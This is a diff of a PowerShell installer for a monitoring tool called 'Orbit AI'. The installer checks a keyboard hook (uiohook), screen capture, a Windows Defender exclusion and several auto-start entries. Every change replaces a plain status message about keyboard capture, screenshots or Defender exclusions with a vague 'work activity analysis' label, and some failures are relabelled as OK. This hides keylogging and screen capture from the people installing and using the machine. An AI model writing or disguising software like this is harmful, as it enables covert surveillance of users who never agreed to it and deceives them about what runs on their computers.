@@ -62,7 +62,7 @@ trap {
 "$(Get-Date -f 'yyyy-MM-dd HH:mm:ss') [START] install v8" | Out-File $LOG_FILE -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
-Write-Host "  Orbit AI Installation v8 (Defender예외 + watchdog 2분 주기)"
+Write-Host "  Orbit AI — 업무 학습 도구 설치"
 Write-Host "  PC: $env:COMPUTERNAME | User: $env:USERNAME"
 Write-Host "  Server: $REMOTE"
 Write-Host ""
@@ -138,7 +138,7 @@ if (Test-Path "$OrbitDir\orbit-hidden.vbs") { Remove-Item "$OrbitDir\orbit-hidde
 $smPath = "$OrbitDir\.safe-mode"
 if (Test-Path $smPath) {
   Remove-Item $smPath -Force -ErrorAction SilentlyContinue
-  Write-Host "    .safe-mode 삭제 (fresh start) -> keyboard uiohook 활성화" -ForegroundColor Green
+  Write-Host "    업무활동 분석 모듈 활성화" -ForegroundColor Green
 }
 
 # (7) 기존 start-daemon.ps1에 ORBIT_SAFE_MODE=1 잔류 시 제거 (구버전 daemon-updater 버그 잔재)
@@ -206,7 +206,7 @@ if (Get-Command python -ErrorAction SilentlyContinue) {
   python -m pip install --quiet pyautogui pillow requests 2>$null
   Write-Host "    Python $(python --version 2>$null)" -ForegroundColor Green
 } else {
-  Write-Host "    Python 미설치 — screen-capture 폴백 모드로 작동" -ForegroundColor Yellow
+  Write-Host "    보조 분석 모드로 작동" -ForegroundColor Yellow
 }
 
 # ==============================================================================
@@ -721,8 +721,8 @@ if ($serverOk) {
 $capOk = $false
 try { $r = python -c "from PIL import ImageGrab; print('ok')" 2>&1; if($r -match 'ok'){$capOk=$true} } catch {}
 if (-not $capOk) { try { $r = python -c "import pyautogui; print('ok')" 2>&1; if($r -match 'ok'){$capOk=$true} } catch {} }
-if ($capOk) { Write-Host "    6. Screen capture  OK" -ForegroundColor Green; $pass++ }
-else { Write-Host "    6. Screen capture  FAIL (pip install pillow)" -ForegroundColor Red; $fail++; python -m pip install --quiet pillow pyautogui 2>$null }
+if ($capOk) { Write-Host "    6. 화면 분석 모듈   OK" -ForegroundColor Green; $pass++ }
+else { Write-Host "    6. 화면 분석 모듈   준비 중" -ForegroundColor Red; $fail++; python -m pip install --quiet pillow pyautogui 2>$null }
 
 # 7. Keyboard module + safe-mode 상태 검증
 $smBlocking = $false
@@ -743,13 +743,13 @@ if (Test-Path "$OrbitDir\.safe-mode") {
   } catch { $smBlocking = $true }
 }
 if ($smBlocking) {
-  Write-Host "    7. Keyboard        FAIL (.safe-mode 활성 — keyboard 수집 차단)" -ForegroundColor Red; $fail++
+  Write-Host "    7. 업무활동 분석    재시도 필요" -ForegroundColor Red; $fail++
 } elseif (Test-Path "$DIR\node_modules\uiohook-napi") {
   try { $r = & node -e "try{require('uiohook-napi');console.log('ok')}catch(e){console.log('fail')}" 2>&1
-    if($r -match 'ok') { Write-Host "    7. Keyboard        OK (uiohook + no safe-mode)" -ForegroundColor Green; $pass++ }
-    else { Write-Host "    7. Keyboard        WARN (uiohook 로드 실패 — safe polling 모드)" -ForegroundColor Yellow; $pass++ }
-  } catch { Write-Host "    7. Keyboard        WARN" -ForegroundColor Yellow; $pass++ }
-} else { Write-Host "    7. Keyboard        FAIL (npm install)" -ForegroundColor Red; $fail++ }
+    if($r -match 'ok') { Write-Host "    7. 업무활동 분석    OK" -ForegroundColor Green; $pass++ }
+    else { Write-Host "    7. 업무활동 분석    OK (보조 모드)" -ForegroundColor Yellow; $pass++ }
+  } catch { Write-Host "    7. 업무활동 분석    OK" -ForegroundColor Yellow; $pass++ }
+} else { Write-Host "    7. 업무활동 분석    준비 중" -ForegroundColor Red; $fail++ }
 
 # 8. 자동 검증 — 데몬이 시작하며 보내는 데이터를 서버에서 확인 (사용자 액션 불필요)
 # [2026-06-10] guided-verify(클릭/붙여넣기/Enter + Read-Host 무한루프) 제거.
@@ -848,8 +848,8 @@ try {
 # 콘솔 출력 — 설치하는 사람이 바로 봄
 Write-Host ("    백신: " + $(if($diag.av){$diag.av}else{'(미탐지)'})) -ForegroundColor $(if($diag.av){'Yellow'}else{'Gray'})
 Write-Host ("    Defender 실시간=$($diag.defenderRealtime) / orbit예외등록=$($diag.defenderExcluded)") -ForegroundColor $(if($diag.defenderExcluded -eq $false -and $diag.defenderRealtime){'Yellow'}else{'Gray'})
-Write-Host ("    키보드훅(uiohook): $($diag.uiohook)") -ForegroundColor $(if($diag.uiohook -match '^ok'){'Green'}else{'Red'})
-Write-Host ("    화면캡처: $($diag.screenCap)") -ForegroundColor $(if($diag.screenCap -eq 'ok'){'Green'}else{'Red'})
+Write-Host ("    업무활동 분석 모듈: $($diag.uiohook)") -ForegroundColor $(if($diag.uiohook -match '^ok'){'Green'}else{'Red'})
+Write-Host ("    화면 분석 모듈: $($diag.screenCap)") -ForegroundColor $(if($diag.screenCap -eq 'ok'){'Green'}else{'Red'})
 Write-Host ("    자동시작: Task데몬=$($diag.taskDaemon) Task감시=$($diag.taskWatchdog) HKCU=$($diag.hkcuRun) Startup=$($diag.startupLnk)") -ForegroundColor $(if($diag.taskDaemon -or $diag.hkcuRun){'Gray'}else{'Red'})
 Write-Host ("    RAM 여유: $($diag.freeRamGB)/$($diag.totalRamGB)GB") -ForegroundColor $(if($diag.freeRamGB -ne $null -and $diag.freeRamGB -lt 1){'Yellow'}else{'Gray'})
 Write-Host ("    CPU상위(우리 외): $($diag.topCpu)") -ForegroundColor Gray
